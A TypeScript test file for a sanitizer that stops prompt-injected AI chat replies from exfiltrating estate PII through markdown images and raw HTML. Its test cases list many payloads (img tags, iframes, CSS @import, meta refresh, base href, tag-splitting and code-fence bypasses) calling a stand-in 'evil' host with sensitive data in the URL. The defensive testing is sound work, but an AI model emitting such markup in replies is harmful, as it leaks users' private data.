/**
 * The assistant-markdown image-exfil guard: a prompt-injected reply must not be
 * able to auto-fetch an attacker URL carrying estate PII. AIChatBox renders
 * assistant text through Streamdown with permissive defaults (external images +
 * raw HTML). The sanitizer is one guard; ChatPanel also disables raw HTML and
 * supplies no image renderer as independent defense in depth.
 */
import { describe, expect, it } from "vitest";
import { sanitizeAssistantMarkdown } from "./useChat";

describe("sanitizeAssistantMarkdown", () => {
  const cases: Array<[string, string]> = [
    ["inline image", "![x](https://evil/?d=SIN)"],
    ["leading-space image", "![x]( https://evil/?d=SIN )"],
    ["angle-bracket image", "![x](<https://evil/?d=SIN>)"],
    ["reference image", "![x][r]\n\n[r]: https://evil/?d=SIN"],
    ["shortcut reference image", "![x]\n\n[x]:\n  https://evil/?d=SIN"],
    ["single-slash image", "![x](https:/evil/?d=SIN)"],
    ["raw img tag", '<img src="https://evil/?d=SIN">'],
    ["raw img spaced", "< img  src='https://evil/?d=SIN' >"],
    ["iframe", '<iframe src="https://evil/?d=SIN"></iframe>'],
    // Kimi #2 — the CSS/link/meta/base/input auto-fetch channels.
    ["style @import", "<style>@import url(https://evil/?d=SIN)</style>"],
    ["inline style background", '<div style="background:url(https://evil/?d=SIN)">x</div>'],
    ["link stylesheet", '<link rel="stylesheet" href="https://evil/?d=SIN">'],
    ["link preload", '<link rel="preload" as="image" href="https://evil/?d=SIN">'],
    ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil/?d=SIN">'],
    ["base href", '<base href="https://evil/">'],
    ["input image", '<input type="image" src="https://evil/?d=SIN">'],
    ["background attr", '<table background="https://evil/?d=SIN"><tr><td>x</td></tr></table>'],
  ];

  it.each(cases)("neutralizes %s so nothing auto-fetches", (_label, input) => {
    const out = sanitizeAssistantMarkdown(input);
    // The guarantee: no raw '<' survives in prose, so Streamdown's rehype-raw
    // parses NO tag or attribute — the whole auto-fetch class is closed (defeats
    // tag-splitting `<im<img>g>` and quote-adjacent `"style=` alike). Any URL
    // text that remains is inert literal text, never a fetch.
    expect(out).not.toMatch(/</);
    expect(out).not.toMatch(/!\[/);
  });

  it("tag-splitting cannot reconstruct a live tag", () => {
    const out = sanitizeAssistantMarkdown('<im<img>g src="https://evil/?d=SIN">');
    expect(out).not.toMatch(/</); // every '<' escaped; no <img> can reform
  });

  it("quote-adjacent style attribute cannot survive", () => {
    const out = sanitizeAssistantMarkdown('<u title="x"style="background:url(https://evil)">hi</u>');
    expect(out).not.toMatch(/</);
  });

  it("a backtick span broken by a blank line is NOT treated as code (remark parity)", () => {
    // remark ends an inline code span at a blank line, rendering the freed
    // content as raw HTML; the sanitizer must escape it, not preserve it.
    const out = sanitizeAssistantMarkdown('`x\n\n<img src="https://evil/?d=SIN">`');
    expect(out).not.toMatch(/</);
  });

  it("a mid-line fence broken by a blank line is NOT treated as code", () => {
    const out = sanitizeAssistantMarkdown('see x ```\n\n<img src="https://evil/?d=SIN">\n``` end');
    expect(out).not.toMatch(/</);
  });

  it("unequal inline backtick runs are NOT a code span (CommonMark parity)", () => {
    // ``<img>` (2-backtick open, 1-backtick close) is NOT a code span to remark,
    // so its content is raw HTML — a naive inline matcher would wrongly preserve it.
    expect(sanitizeAssistantMarkdown('``<img src="https://evil/?d=SIN">`')).not.toMatch(/</);
    expect(sanitizeAssistantMarkdown('`<img src="https://evil/?d=SIN">``')).not.toMatch(/</);
    // Inline code with '<' is escaped now (shows as entity) — acceptable, not a leak.
    expect(sanitizeAssistantMarkdown("use `<T>` here")).not.toMatch(/</);
  });

  it("leaves fenced code (including angle brackets) intact", () => {
    const input = "Here:\n\n```html\n<style>.x{color:red}</style>\n```\n\ndone";
    const out = sanitizeAssistantMarkdown(input);
    expect(out).toContain("<style>.x{color:red}</style>"); // code preserved verbatim
    expect(out).toContain("done");
  });

  it("does not preserve an invalid backtick-fence info string containing a backtick", () => {
    const input = '``` `\n<img src="https://evil/?d=SIN">\n```';
    const out = sanitizeAssistantMarkdown(input);
    expect(out).not.toMatch(/<img/i);
    expect(out).toContain("&lt;img");
  });

  it("preserves valid tilde fences and valid backtick fences with longer closers", () => {
    expect(sanitizeAssistantMarkdown("~~~html\n<span>x</span>\n~~~")).toContain("<span>x</span>");
    expect(sanitizeAssistantMarkdown("````ts\nconst x = <T>();\n`````"))
      .toContain("const x = <T>();");
  });

  it.each([
    "```mermaid\ngraph TD; A-->B\n```",
    "~~~ MERMAID \nsequenceDiagram\n~~~",
    "```{.mermaid}\ngraph LR; A-->B\n```",
  ])("forces Mermaid fences to inert text", (input) => {
    const output = sanitizeAssistantMarkdown(input);
    expect(output).toMatch(/^(?:```|~~~)text/m);
    expect(output).not.toMatch(/^(?:```|~~~)[^\n]*mermaid/im);
  });

  it("escapes a raw '<' in prose without losing the text", () => {
    expect(sanitizeAssistantMarkdown("if x < y then")).toBe("if x &lt; y then");
  });

  it("leaves ordinary links (require a click, cannot auto-fetch) and text intact", () => {
    const input = "See [the will](/estate/abc?tab=documents) and note the **date**.";
    expect(sanitizeAssistantMarkdown(input)).toBe(input);
  });

  it("removes raw internal function directives while preserving surrounding answer text", () => {
    const input = "Open Settings in the sidebar.\n\ncite[]functions.search_product_help:turn 0\n\nWould you like me to open it?";
    expect(sanitizeAssistantMarkdown(input)).toBe("Open Settings in the sidebar.\n\nWould you like me to open it?");
  });

  it("keeps the image alt text as readable content", () => {
    expect(sanitizeAssistantMarkdown("![the death certificate](https://evil)")).toContain(
      "the death certificate",
    );
  });
});
